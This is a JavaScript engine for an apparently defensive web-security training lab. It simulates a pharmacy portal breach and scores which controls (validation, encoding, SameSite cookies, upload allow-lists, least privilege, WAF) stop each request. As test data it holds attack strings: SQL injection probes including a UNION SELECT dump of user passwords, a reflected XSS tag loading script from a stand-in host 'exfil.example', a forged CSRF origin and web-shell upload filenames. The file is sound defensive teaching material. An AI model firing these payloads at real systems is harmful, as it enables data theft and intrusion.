/* ==========================================================================
   GATEHOUSE lab — js/engine.js
   Simulation engine: control gates, request library, verdicts, upload rules.
   Ported 1:1 from the original framework lab (src/components/cyberlab/engine.ts).
   Every verdict is a deterministic, explainable rule (defensive education only).
   ========================================================================== */
(function () {
  "use strict";
  var GH = (window.GH = window.GH || {});

  /** Incident-time state of the VeriScript Rx portal (the "before" config). */
  var INITIAL_CONTROLS = {
    patientIdValidation: "none",
    outputEncoding: "none",
    cspHeader: false,
    roleSvcWeb: "superadmin",
    roleSLim: "pharmacist",
    mfaAdmin: false,
    cookieHttpOnly: false,
    cookieSecure: false,
    cookieSameSite: false,
    sessionTimeout: "720",
    dbQueryStyle: "concatenated",
    dbAccount: "dba-equivalent",
    tlsMode: "http",
    atRest: "none",
    passwordHash: "md5",
    uploadValidation: "client-only",
    uploadStorage: "webroot-exec",
    uploadScan: false,
    wafMode: "monitor",
    appLogging: "errors-only",
    siemForward: false,
    sessionsRevoked: false,
  };

  var GATES = [
    { id: "validation", label: "Input validation", family: "prevent" },
    { id: "encoding", label: "Encoding & CSP", family: "prevent" },
    { id: "authz", label: "Access control", family: "prevent" },
    { id: "data", label: "Data layer", family: "prevent" },
    { id: "upload", label: "File handling", family: "prevent" },
    { id: "detection", label: "WAF & monitoring", family: "detect" },
  ];

  function det(c) {
    return c.wafMode !== "off" || c.appLogging === "full-audit";
  }

  var REQUESTS = [
    {
      id: "ben-refill",
      label: "Pharmacist opens a refill record",
      kind: "benign",
      method: "GET",
      target: "/api/refills?patientId=4821",
      note: "Everyday traffic — the pipeline must never break this.",
      verdict: function (c) {
        var o = {
          blocked: false,
          blockedAt: null,
          reason:
            "Numeric id passes validation, the query is harmless, the user is authorized. Benign traffic flows.",
          detected: false,
        };
        if (c.tlsMode === "http")
          o.warning =
            "Accepted — but with TLS off, this traffic (and its session cookie) crosses the network in cleartext.";
        if (c.tlsMode === "tls-any")
          o.warning =
            "Accepted over TLS — but 'any TLS' still allows TLS 1.0/1.1, which are obsolete and vulnerable. Pin TLS 1.2+.";
        return o;
      },
    },
    {
      id: "sqli-taut",
      label: "SQL injection — tautology probe",
      kind: "malicious",
      method: "GET",
      target: "/api/refills?patientId=4821' OR '1'='1",
      note: "Makes the WHERE clause always-true.",
      verdict: function (c) {
        if (c.patientIdValidation === "numeric-strict")
          return {
            blocked: true,
            blockedAt: "validation",
            reason:
              "The server-side numeric allow-list rejects the apostrophe before a query is ever built. This is the primary, code-level control.",
            detected: true,
          };
        if (c.dbQueryStyle === "parameterized")
          return {
            blocked: true,
            blockedAt: "data",
            reason:
              "The value reaches the database only as a bound parameter — the driver treats it as inert data, so the injection cannot change query structure.",
            detected: true,
          };
        if (c.wafMode === "block")
          return {
            blocked: true,
            blockedAt: "detection",
            reason:
              "WAF virtual-patch matched the injection signature and rejected the request. Useful — but a compensating layer, not a code fix.",
            detected: true,
          };
        return {
          blocked: false,
          blockedAt: null,
          reason:
            "Concatenated into the SQL string, `OR '1'='1'` makes the WHERE clause always-true — every refill record is returned to the attacker.",
          detected: det(c),
        };
      },
    },
    {
      id: "sqli-union",
      label: "SQL injection — UNION dump",
      kind: "malicious",
      method: "GET",
      target: "/api/refills?patientId=0 UNION SELECT username,password FROM users--",
      note: "Appends a second query that empties the users table.",
      verdict: function (c) {
        if (c.patientIdValidation === "numeric-strict")
          return {
            blocked: true,
            blockedAt: "validation",
            reason:
              "Numeric allow-list rejects the spaces, letters and dashes before the query layer. Injection dies at the front gate.",
            detected: true,
          };
        if (c.dbQueryStyle === "parameterized")
          return {
            blocked: true,
            blockedAt: "data",
            reason:
              "Prepared statement: the whole string is bound as one inert parameter. UNION SELECT never executes as SQL.",
            detected: true,
          };
        if (c.wafMode === "block")
          return {
            blocked: true,
            blockedAt: "detection",
            reason:
              "WAF signature (UNION SELECT pattern) blocked it. Remember: signatures lag novel payloads — the code fix is the durable control.",
            detected: true,
          };
        return {
          blocked: false,
          blockedAt: null,
          reason:
            "The UNION SELECT appends a second query — the users table (usernames + password hashes) is dumped into the response.",
          detected: det(c),
        };
      },
    },
    {
      id: "ben-search",
      label: "Patient searches the drug formulary",
      kind: "benign",
      method: "GET",
      target: "/search?q=amoxicillin%20dosage",
      note: "Contains %20-encoding — still perfectly benign.",
      verdict: function () {
        return {
          blocked: false,
          blockedAt: null,
          reason:
            "A search term with URL-encoding is normal traffic. Over-strict filters that break this are a false-positive machine.",
          detected: false,
        };
      },
    },
    {
      id: "xss-probe",
      label: "Reflected XSS probe",
      kind: "malicious",
      method: "GET",
      target: "/search?q=<script src=//exfil.example/x.js></script>",
      note: "Script tag reflected back into the results page.",
      verdict: function (c) {
        if (c.outputEncoding !== "none")
          return {
            blocked: true,
            blockedAt: "encoding",
            reason:
              "Output encoding renders the payload as inert text — the browser displays the characters instead of executing them. Context-aware encoding also covers attribute and JS contexts.",
            detected: true,
          };
        if (c.wafMode === "block")
          return {
            blocked: true,
            blockedAt: "detection",
            reason:
              "WAF pattern matched '<script'. Signature WAFs are bypassable (encoding tricks, event handlers) — encoding is the real fix.",
            detected: true,
          };
        return {
          blocked: false,
          blockedAt: null,
          reason:
            "The script executes in the visitor's browser: sessions, keystrokes and PHI can be stolen in the victim's own session.",
          detected: det(c),
          warning: c.cspHeader
            ? "CSP blocked the external script load (no exfil this time) — but the injection still renders inline. Encoding remains the primary fix."
            : undefined,
        };
      },
    },
    {
      id: "csrf-forged",
      label: "Forged cross-site refill approval",
      kind: "malicious",
      method: "POST",
      target: "/api/refills/approve",
      origin: "https://meds-portal-deals.example",
      note: "Victim's browser auto-attaches its session cookie.",
      verdict: function (c) {
        if (c.cookieSameSite)
          return {
            blocked: true,
            blockedAt: "authz",
            reason:
              "SameSite cookies are not sent on cross-site POSTs — the forged request arrives unauthenticated and is rejected.",
            detected: true,
          };
        return {
          blocked: false,
          blockedAt: null,
          reason:
            "The browser silently attached the victim's session cookie: the approval executes as the victim. No SameSite flag and no anti-CSRF token means no defense.",
          detected: det(c),
        };
      },
    },
    {
      id: "ben-upload",
      label: "Pharmacist uploads a signed audit PDF",
      kind: "benign",
      method: "POST",
      target: "/upload/documents (pharmacy_audit_q4.pdf — %PDF-1.7)",
      note: "Legitimate business file.",
      verdict: function (c) {
        var o = {
          blocked: false,
          blockedAt: null,
          reason:
            "A genuine PDF (correct magic bytes) passes any reasonable upload policy — allow-lists, deny-lists and content checks all admit it.",
          detected: false,
        };
        if (c.uploadScan) o.warning = "Malware scan: clean.";
        if (c.uploadStorage === "webroot-exec")
          o.warning =
            "Stored in the executable webroot — harmless because it is a real PDF, but policy keeps uploads outside the webroot precisely so a future bad file cannot execute.";
        return o;
      },
    },
    {
      id: "mal-upload",
      label: "Web-shell upload (content-type spoof)",
      kind: "malicious",
      method: "POST",
      target: "/upload/documents (pharmacy_audit_2025.php — declared: application/pdf)",
      note: "The successful attack from IR-2417.",
      verdict: function (c) {
        if (c.uploadValidation === "allowlist-magic")
          return {
            blocked: true,
            blockedAt: "upload",
            reason:
              "Two independent checks fail: '.php' is not on the server-side allow-list AND the magic bytes say PHP script, not PDF. The file never lands.",
            detected: true,
          };
        if (c.uploadValidation === "extension-blocklist")
          return {
            blocked: true,
            blockedAt: "upload",
            reason:
              "The deny-list caught '.php' — it works for THIS file, but deny-lists lose to variants ('.php5', '.phtml', double extensions). Prefer allow-lists.",
            detected: true,
          };
        if (c.wafMode === "block")
          return {
            blocked: true,
            blockedAt: "detection",
            reason:
              "WAF virtual-patch rejects executable upload attempts. Good compensating control while the code is fixed.",
            detected: true,
          };
        return {
          blocked: false,
          blockedAt: null,
          reason:
            c.uploadStorage === "webroot-exec"
              ? "Client-side-only checks were trivially bypassed — the PHP file lands in the EXECUTABLE webroot. Requests to /uploads/pharmacy_audit_2025.php now run attacker code: a web shell (T1505.003)."
              : "Client-side-only checks were bypassed — the file is stored outside the webroot, so it is not directly executable. Still a malicious file on disk: alert the file-integrity and malware pipeline.",
          detected: det(c),
        };
      },
    },
    {
      id: "priv-abuse",
      label: "Shell-level access to the admin API",
      kind: "malicious",
      method: "POST",
      target: "/api/admin/users (as svc_veriweb)",
      note: "What the web shell did next in the incident.",
      verdict: function (c) {
        if (c.roleSvcWeb !== "superadmin")
          return {
            blocked: true,
            blockedAt: "authz",
            reason:
              "The service account runs least-privilege (app-runtime). The admin API answers 403 — even a successful foothold hits a wall. Broken-access-control damage contained.",
            detected: true,
          };
        return {
          blocked: false,
          blockedAt: null,
          reason:
            "svc_veriweb holds superadmin: the shell exports patient records and reconfigures the app. Over-privileged accounts turn any foothold into a breach (broken access control).",
          detected: det(c),
        };
      },
    },
  ];

  var UPLOAD_SAMPLES = [
    {
      id: "u1",
      name: "pharmacy_audit_2025.php",
      declared: "application/pdf",
      content: "<?php ... (PHP code detected)",
      malicious: true,
      note: "The IR-2417 shell — extension gives it away.",
    },
    {
      id: "u2",
      name: "scan_report.jpg",
      declared: "image/jpeg",
      content: "<?php ... (PHP code detected)",
      malicious: true,
      note: "Extension looks safe; content is code. Content inspection required.",
    },
    {
      id: "u3",
      name: "policy_v2.php5",
      declared: "application/pdf",
      content: "<?php ... (PHP code detected)",
      malicious: true,
      note: "Obscure extension dodges naive '.php' deny-lists.",
    },
    {
      id: "b1",
      name: "pharmacy_audit_q4.pdf",
      declared: "application/pdf",
      content: "%PDF-1.7 (valid PDF header)",
      malicious: false,
      note: "Business as usual.",
    },
    {
      id: "b2",
      name: "refill_log_march.csv",
      declared: "text/csv",
      content: "plain CSV text",
      malicious: false,
      note: "Business as usual.",
    },
  ];

  function ruleMatches(sample, rule) {
    var v = rule.value.trim().toLowerCase();
    if (!v) return false;
    if (rule.field === "filename") {
      var name = sample.name.toLowerCase();
      return rule.op === "ends_with" ? name.endsWith(v) : name.includes(v);
    }
    var content = sample.content.toLowerCase();
    return rule.op === "contains" ? content.includes(v) : content.endsWith(v);
  }

  function runRules(rules, samples) {
    var mal = 0;
    var ben = 0;
    samples.forEach(function (s) {
      var flagged = rules.some(function (r) {
        return ruleMatches(s, r);
      });
      if (flagged) {
        if (s.malicious) mal++;
        else ben++;
      }
    });
    return { mal: mal, ben: ben };
  }

  /** Simulate a request and return the full outcome record. */
  function simulate(req, controls) {
    var out = req.verdict(controls);
    out.reqId = req.id;
    return out;
  }

  GH.INITIAL_CONTROLS = INITIAL_CONTROLS;
  GH.GATES = GATES;
  GH.REQUESTS = REQUESTS;
  GH.UPLOAD_SAMPLES = UPLOAD_SAMPLES;
  GH.ruleMatches = ruleMatches;
  GH.runRules = runRules;
  GH.simulate = simulate;
})();
